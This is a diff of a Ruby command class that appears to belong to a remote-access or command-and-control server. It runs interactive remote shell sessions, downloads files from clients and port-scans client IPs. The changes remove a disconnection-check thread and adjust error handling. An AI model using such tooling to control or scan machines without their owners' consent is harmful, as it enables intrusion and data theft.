@@ -23,26 +23,6 @@ class Commands
     t = Thread.new do
       client.puts 'session'
       puts "session started with #{client.to_s}"
-      # This threads is to check for disconnections. It does the same thing as the heartbeat function in server.
-      # We are checking whether port 7777 is open a second time simultaneously.
-      # If the connection fails then we delete the client from the list and break out of the session
-      Thread.new do
-        loop do
-          sleep 1
-          begin
-            TCPSocket.new(client.ip, 7777).close
-          rescue
-            puts "#{client.to_s} disconnected\r"
-            puts 'closing session'
-            client.sock.close
-            Server.mutex.synchronize do
-              Server.instance.clients.delete client
-            end
-            t.exit
-            break
-          end
-        end
-      end
       loop do
         print '$ '
         command = STDIN.gets.chomp
@@ -86,7 +66,7 @@ class Commands
       return
     end
     length = client.sock.gets.to_i
-    file.write client.sock.read(length)
+    file.write client.sock.read length
     file.close
     puts 'Download finished'
   end
@@ -119,7 +99,7 @@ class Commands
       begin
         TCPSocket.new(client.ip,port).close
         puts "#{port} open"
-      rescue Errno::ECONNREFUSED
+      rescue Errno::ECONNREFUSED, Errno::EHOSTUNREACH
       end
     end
     puts 'scan finished'
@@ -157,18 +137,11 @@ class Commands
 
   # Prints out a list of the connected clients
   def self.clients_table(clients)
-    clients.sort_by(&:id)
-    clients.each do |client|
-      begin
-        TCPSocket.new(client.ip, 7777).close
-      rescue
-        clients.delete client
-      end
-    end
     if clients.empty?
       puts 'No clients connected'
       return
     end
+    clients.sort_by(&:id)
     # There is no way to delete the last row from the table. So I put the rows in an array and remove the last before adding them to the table becasue it always ends up with a trailing separator
     rows = []
     t = Terminal::Table.new(:title => 'CLIENTS', :headings => ['ID', 'IP ADDRESS', 'NAME', 'OS']) do |t|
